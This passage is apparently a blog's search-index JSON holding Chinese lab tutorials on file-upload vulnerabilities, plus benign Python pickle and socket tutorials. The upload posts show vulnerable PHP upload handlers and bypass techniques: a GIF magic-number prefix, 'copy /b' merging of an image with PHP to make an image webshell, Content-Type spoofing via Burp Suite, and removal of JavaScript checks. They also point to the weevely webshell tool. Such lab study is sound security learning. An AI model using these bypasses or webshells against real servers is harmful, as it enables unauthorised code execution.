服务端文件内容检测/","link":"","permalink":"https://fishni.github.io/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测","text":"本文主要内容 简单文件头检测、文件幻数检测 完整文件结构检测 0x01 简单文件头检测 文件幻数检测 JPG ： FF D8 FF E0 00 10 4A 46 49 46 GIF ： 47 49 46 38 39 61 (GIF89a) PNG： 89 50 4E 47 如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。 简单文件头检测测试示例 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a 1GIF89a&lt;?php phpinfo();?&gt; 测试：利用burpsuite截包，repeater重放功能 利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析） 0x02 完整文件结构检测 通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。 但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过 2.1 绕过方法 将图片文件与欲上传的文件进行合并绕过检测 copy命令进行文件合并 合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性 上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码 2.2图片一句话木马制作 创建一个文件夹，包含a.bat,tp.gif,yjh.php a.bat内容为cmd；yjh.php内容为&lt;?php phpinfo(): ?&gt; 点击bat文件进入DOS命令，写入”copy tp.gif/b+yjh.php tpyjh.gif” 回车 2.3实战示例 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = isImage($temp_file); if(@imagecreatefromgif($temp_file))&#123; if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = \"uploads/\".rand(10, 99).$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125; &#125;else&#123; $msg=\"文件不是gif图片\"; &#125;&#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 利用burpsuite重放，获取生成的随机图片文件 利用本地文件包含访问图片 0x03 恶意文件内容检测 检测提交内容中是否包含Webshell等数据 推荐使用强混淆的weevely进行尝试，kail中自带https://github.com/sunge/Weevely 或者尝试开源的webshell收集项目https://github.com/tennc/webshell","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过","slug":"3.1 服务端MIME类型检测绕过","date":"2020-03-26T16:00:00.000Z","updated":"2020-04-14T08:53:37.771Z","comments":true,"path":"2020/03/27/3.1 服务端MIME类型检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文内容 文件头content-type字段校验（image/gif等）绕过","text":"本文内容 文件头content-type字段校验（image/gif等）绕过 0x01 服务端一般检测的内容 上传的文件名（扩展名、黑白名单） MIME/TYPE （浏览器根据文件扩展名自动生成） 0x02 MIME了解 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。 MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。 浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上 常见的白名单MIME/TYPE 0x03 实例分析 环境：windows+phpstudy+burpsuite 由于本地127.0.0.1burpsuite截不到包故采用本地网络地址 测试代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/&gt;&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = 'uploads/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; $msg= \"&lt;br/&gt;成功上传至:&lt;b&gt; \".$img_path.\"&lt;/b&gt;\"; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125;?&gt;&lt;div id=\"upload_panel\"&gt; &lt;ol&gt; &lt;li&gt; &lt;h3&gt;上传区&lt;/h3&gt; &lt;form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt; &lt;/form&gt; &lt;div id=\"msg\"&gt; &lt;?php if($msg != null)&#123; echo \"提示：\".$msg; &#125; ?&gt; &lt;/div&gt; &lt;div id=\"img\"&gt; &lt;?php if($is_upload)&#123; echo '&lt;img src=\"'.$img_path.'\" width=\"250px\" /&gt;'; &#125; ?&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ol&gt;&lt;/div&gt; 尝试上传一个含phpinfo的文件（phpinfo.php） 使用burpsuite截断修改content-type，重新提交报文 将burpsuite截断关闭，访问上传的文件","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.1客户端检测绕过","slug":"2.1 客户端检测绕过","date":"2020-03-25T16:00:00.000Z","updated":"2020-04-14T08:53:10.454Z","comments":true,"path":"2020/03/26/2.1 客户端检测绕过/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/","excerpt":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例","text":"本文主要内容 主要客户端检测绕过类型 前端js检测绕过示例 0x01 客户端检测绕过（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。 例如：普通的表单上传（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。 例如:DZ的头像上传（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中 客户端检测一般只检测文件扩展名 客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有 0x02 前端JavaScript检测绕过 查看onchange、onsubmit等事件 onchange事件会在域的内容改变时发生 onsubmit事件会在表单中的确认按钮被点击时发生 删除掉相关事件中的检测函数 0x03 测试案例（1）环境 windows+phpstudy+uploadlab （2）尝试上传含phpinfo()函数的php文件（phpinfo.php） （3）F12审查元素代码，找到事件触发函数 （4）删除onsubmit，重新提交，并访问上传的文件 （5）查看网页源代码可找到上传文件路径相关信息 （6）js校验代码如下 12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt;","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（二）：前端检测绕过】2.2提交报文修改检测","slug":"2.2 提交报文修改检测","date":"2020-03-25T16:00:00.000Z","updated":"2020-04-14T08:53:25.106Z","comments":true,"path":"2020/03/26/2.2 提交报文修改检测/","link":"","permalink":"https://fishni.github.io/2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/","excerpt":"本文主要内容 提交报文修改检测 绕过示例","text":"本文主要内容 提交报文修改检测 绕过示例 0x01 提交报文修改检测（前端检测通用） 首先选择正常的文件进行上传 而后通过BurpSuite进行截包改包或改包重放完成文件上传 这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交 0x02 示例（1）环境 （2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包 （3）burpsuite进行重放 原始 修改后：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"【文件上传（一）】1.1文件上传漏洞原理及流程","slug":"1.1 文件上传漏洞原理及流程","date":"2020-03-24T16:00:00.000Z","updated":"2020-04-14T08:50:53.361Z","comments":true,"path":"2020/03/25/1.1 文件上传漏洞原理及流程/","link":"","permalink":"https://fishni.github.io/2020/03/25/1.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%81%E7%A8%8B/","excerpt":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例","text":"本文主要内容 文件上传流程、漏洞原因 burpsuite简单安装 dvwa文件上传简单示例 文件上传流程： 1.前端选择文件，进行提交 2.浏览器形成POST MultiPart报文发送到服务器 3.服务器中间件接收到报文，解析后交给相关后端代码进行处理 4.后端代码将上传的文件内容写入到临时文件中（PHP特有） 5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名 文件上传漏洞产生原因 文件上传未对上传的文件进行严格的验证和过滤，容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等） 如果上传的目标目录没有限制执行权限，导致上传的动态文件（比如：webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。 存在上传漏洞的必要条件 存在上传点 可以上传动态文件 上传目录有执行权限，并且上传的文件可执行 可访问到上传的动态文件 上传检测流程 BurpSuite简单安装 下载jdk 官网下载Burp Suite 2.1 参考链接：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=54760&amp;highlight=burpsuite 简单代理配置 火狐浏览器：选项-》网络设置-》设置 burpsuite设置： 使burpsuite支持对DVWA环境（本地环境）进行抓包（此方法仅尝试成功一次，貌似不可行） 在火狐浏览器url栏输入：about:config 然后在搜索栏输入：network.proxy.allow_hijacking_localhost dvwa文件上传low简单示例 burpsuite截包 使burpsuite支持对DVWA环境（本地环境）进行抓包（采用了本地地址ip的访问方式） 将代理都修改为端口9999 测试：","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"}]},{"title":"python序列化数据之pickle详解","slug":"python序列化数据之pickle详解","date":"2020-03-14T16:00:00.000Z","updated":"2020-03-30T06:32:58.535Z","comments":true,"path":"2020/03/15/python序列化数据之pickle详解/","link":"","permalink":"https://fishni.github.io/2020/03/15/python%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E4%B9%8Bpickle%E8%AF%A6%E8%A7%A3/","excerpt":"学习python之pickle详解","text":"学习python之pickle详解 序列化和反序列化 便于存储（序列化过程：将文本信息转为==二进制数据流，易存储在硬盘中==） 反序列化从硬盘读取的数据，可得到原始数据 python程序运行中得到的字符串、列表等数据，要长久保存，方便之后使用（pickle模块可以将对象转换为已知可以传输或存储的格式） python中序列化和反序列化 将Python对象转换为二级制形式叫做序列化（Pickling） 将二进制数据流恢复为Python对象叫做反序列化（Unpickling） pickle 提供了一个简单的==持久化==功能，可以将对象以==文件==形式存放在磁盘上 只能在python中使用，可以序列化python中几乎所有的数据类型（列表、字典…） pickle序列化后的数据，可读性差 pickle序列化和反序列化示例 819pickling_unpickling_example.py 123456789101112131415161718192021222324252627282930313233import pickle# 定义类Partclass Part: number = 0 name = \"\" def __init__(self, number, name): self.number = number self.name = name def identify(self): print(\"Part Number: %d\"%(self.number)) print(\"Part Name: %s\"%(self.name)) # 实例化partpart1=Part(111, \"Spindle\");# Create a file to store the pickled object# 创建文件存储pickled对象objectRepository = open(\"ObjectFile.picl\", \"wb\"); # Pickle/serialize the python object and store the bytes into a binary file# 序列化Python对象并存储为二进制字节流pickle.dump(part1, objectRepository, protocol=pickle.HIGHEST_PROTOCOL)objectRepository.close() # Unpickle/de-serialize the python object and print the attributes of the object# 反序列化Python对象并打印对象属性objectRepository = open(\"ObjectFile.picl\", \"rb\",);reconstructedObject = pickle.load(objectRepository) # Print object attributes# 打印对象属性reconstructedObject.identify() 12 - 运行结果： (venv) yuhao@fishmouse:~/Envs/venv/project$ python 819pickling_unpickling_example.py Part Number: 111 Part Name: Spindle 12345678- 序列化的数据 &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;ObjectFile.picl&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;\\x80\\x04\\x959\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Part\\x94\\x93\\x94)\\x81\\x94&#125;\\x94(\\x8c\\x06number\\x94Ko\\x8c\\x04name\\x94\\x8c\\x07Spindle\\x94ub.&#39; ==序列化==语法 pickle.dump参考链接 pickle.dump(obj,file[,protocol]) 序列化对象，将结果数据流写入到文件对象或者buffer中 参数protocol是序列化模式，一共有5种不同的类型，即（0,1,2,3,4）； （0,1,2）早期的版本，默认值为0（表示以文本形式序列化），值为1或2（表示以二级制的形式序列化）； （3,4）则是python3之后的版本 查看（3,4） 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.HIGHEST_PROTOCOL4&gt;&gt;&gt; pickle.DEFAULT_PROTOCOL3 pickle.dump()：转换的字节流写入buffer中 示例：819pickle_dump_example.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import pickleimport io class Book: title = \"\" isbn = \"\" parts = None chapters = None def __init__(self, title, isbn, parts, chapters): self.title = title self.isbn = isbn self.parts = parts self.chapters = chapters def identify(self): print(\"Title of the book: %s\"%(self.title)) print(\"ISBN of the book: %s\"%(self.isbn)) print(\"Parts are:\") for part in self.parts: print(part) print(\"Chapters are:%s\"%(self.chapters))class Part: partName = \"\" beginChapter = -1 endChapter = -1 def __init__(self, partName, beginChapter, endChapter): self.partName = partName self.beginChapter = beginChapter self.endChapter = endChapter def __str__(self): stringRep = \"%s\"%(self.partName) return stringReppart1 = Part(\"Part 1\", 1, 3)part2 = Part(\"Part 2\", 4, 5) part3 = Part(\"Part 3\", 6, 7) bookTitle = \"Book yet to be written\";bookISBN = \"XXX-X-XX-XXXXXX-X\";bookParts = [part1, part2, part3]bookChapters = [\"Chapter 1\", \"Chapter 2\", \"Chapter 3\", \"Chapter 4\", \"Chapter 5\", \"Chapter 6\", \"Chapter 7\"];book = Book(bookTitle, bookISBN, bookParts, bookChapters)# 创建buffer存储pickle对象pickleBuffer = io.BytesIO()print(\"Pickling of the object into the memory buffer started\")# pickle.dump(book,pickleBuffer)print(\"Pickling of the object into the memory buffer ended\")print(\"Pickled buffer beginning address:\")print(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory started\")#unpickledBook = pickle.loads(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory ended\")print(\"Printing the attributes of unpickled object\")unpickledBook.identify() pickle.dumps()参数 pickle.dumps(obj, protocol=None,*,fix_imports=True) 与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象 ==反序列化==语法 pickle.load(file) 反序列化对象（将文件中数据解析为一个Python对象） ==注意==：load(file)时，要让Python能够找到类的定义,否则会报错 注意：参数file，必须是以二进制的形式进行操作（读取） 示例：819test_pickle.py 反序列方法pickle.loads() 参数如下： pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”) pickle.loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下： 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.dumps([1,2,3])b'\\x80\\x03]q\\x00(K\\x01K\\x02K\\x03e.'&gt;&gt;&gt; pickle.loads(_)[1, 2, 3] 1234567891011121314#load(file)时，要让Python能够找到类的定义,否则会报错import pickle class Person: def __init__(self,n,a): self.name=n self.age=a def show(self): print(self.name+\" \"+str(self.age)) aa = Person(\"JGood\", 2) aa.show() # del Personf=open('p.txt','wb') pickle.dump(aa,f,0) f.close() 123456 注释掉删除类对象操作，若未注释则会报错del Person f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;) bb&#x3D;pickle.load(f) f.close() bb.show() 运行结果： 123(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2JGood 2 未注释结果： 1234567891011121314 (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2Traceback (most recent call last): File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt; bb&#x3D;pickle.load(f) AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt; [p.txt](p.txt)文件中数据存储格式： &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nPerson\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVJGood\\np7\\nsVage\\np8\\nL2L\\nsb.&#39;","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"python网络编程01","slug":"python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序","date":"2020-03-14T05:55:42.000Z","updated":"2020-03-30T05:51:24.632Z","comments":true,"path":"2020/03/14/python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序/","link":"","permalink":"https://fishni.github.io/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/","excerpt":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序","text":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序 学习步骤构建python环境同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包 利用virtualenvwrapper管理virtualenv虚拟环境 mkvirtualenv venv ：创建虚拟环境venv workon ：查看当前已有虚拟环境目录 workon venv ：进入venv虚拟环境 deactivate ：退出虚拟环境 rmvirtualenv venv：删除虚拟环境venv socket概念 运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）： 套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符 socket.socket对象的fileno()方法 1234&gt;&gt;&gt; import socket&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.fileno()3 IP地址、端口号 端口号（port）传输层协议内容、用来标识一个进程 一个端口号只能被一个进程占用 IP地址 + 端口号能标识网络上的某一台主机的某一个进程 套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字 套接字类型（常用的两种） 流套接字：创建socket对象时（用socket.SOCK_STREAM） 面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送 数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM 提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性 利用socket类方法获取主机、网络及目标服务的信息 获取主机名、地址 12345&gt;&gt;&gt; import socket&gt;&gt;&gt; socket.gethostname()'fishmouse'&gt;&gt;&gt; socket.gethostbyname(_)'127.0.1.1' 获取远程设备IP地址（如获取：www.baidu.com） 12&gt;&gt;&gt; socket.gethostbyname('www.baidu.com')'14.215.177.38' 可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通 12345(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;3 ttl&#x3D;55 time&#x3D;34.8 ms IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa inet_aton()使用 123456&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; import binascii&gt;&gt;&gt; binascii.hexlify(_)b'7f000001' 观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据 10进制结果，单个字节转换 123&gt;&gt;&gt;import struct&gt;&gt;&gt; struct.unpack('B',b'\\x7f')[0]127 inet_ntoa()使用：32位二进制包转换为IPv4地址 12345a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; socket.inet_ntoa(_)'127.0.0.1' 通过指定的端口和协议找到服务名 socket.getservbyport() 12345678910&gt;&gt;&gt; socket.getservbyport(80)'http'&gt;&gt;&gt; socket.getservbyport(53)'domain'&gt;&gt;&gt; socket.getservbyport(25)'smtp'&gt;&gt;&gt; socket.getservbyport(21)'ftp'&gt;&gt;&gt; socket.getservbyport(3306)'mysql' socket.getservbyname() ：通过服务名获取端口 1234&gt;&gt;&gt; socket.getservbyname('ssh')22&gt;&gt;&gt; socket.getservbyname('http')80 linux系统中，etc/services文件中可查看相关服务和端口 主机字节序和网络字节序之间的转换 不同主机a，b之间通信，数据格式需转换 a的固有数据存储——-标准化——–转化成b的固有格式 也即为： ==a的主机字节序———-网络字节序 ———b的主机字节序== 主机字节序 主机内部，内存中数据的处理方式，可以分为两种： 大端字节序：按照内存的增长方向，高位数据存储在高位内存中 小端字节序：按照内存的增长方向，高位数据存储在低位内存中 socket.ntohl()、socket.htonl()、ntohs()、htons() 1234567891011&gt;&gt;&gt; data = 1234&gt;&gt;&gt; socket.htonl(data)3523477504&gt;&gt;&gt; socket.htons(data)53764&gt;&gt;&gt; socket.ntohl(data)3523477504&gt;&gt;&gt; socket.ntohs(data)53764 &gt;&gt;&gt; socket.ntohs(53764)1234 设定并获取默认的套接字超时时间 socket.gettimeout()、socket.settimeout() 12345&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.gettimeout()&gt;&gt;&gt; s.settimeout(100)&gt;&gt;&gt; s.gettimeout()100.0 默认套接字超时时间为0 套接字错误异常处理 try…except 套接字异常类型 as 参数… argparse：命令项选项与参数解析的模块 parser=argparse.ArgumentParser()：创建解析对象 parser.add_argument()：向对象中添加关注的命令行参数和选项 given_args = parser.parse_args()：对象解析 套接字发送和接收的缓冲区大小修改 socket中getsockopt()、setsockopt()方法 套接字阻塞模式和非阻塞模式 s= socket.socket() s.setblocking(1)：设为阻塞模式 s.setblocking(0)：设为非阻塞模式 默认情况下，TCP套接字处于阻塞模式 UDP 多路复用：允许多个会话共享同一介质或机制的一种解决方案 UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解 TCP：多路复用、可靠传输 UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址 使用自环接口的UDP服务器和 客户端 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# UDP client and server on localhost# 814udp_local.py import argparse, socketfrom datetime import datetimeMAX_BYTES = 65535# serverdef server(port): sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) sock.bind(('127.0.0.1',port)) # 